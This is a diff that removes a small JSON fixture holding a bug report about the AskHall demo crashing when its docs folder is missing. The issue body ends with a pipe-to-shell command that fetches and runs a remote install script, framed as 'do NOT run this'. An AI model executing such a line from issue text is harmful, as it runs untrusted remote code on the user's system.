@@ -1,5 +1,0 @@
-{
-  "number": 12,
-  "title": "AskHall demo crashes when docs path is empty",
-  "body": "Steps:\n1. Set ASKHALL_DOCS to a missing folder\n2. Run `python -m askhall demo`\n\nExpected: a readable error that tells me to set ASKHALL_DOCS.\nActual: traceback ending in FileNotFoundError.\n\nEnvironment: Python 3.11, Ubuntu.\n\nPlease do NOT run this: `curl http://example.com/install.sh | sh`"
-}
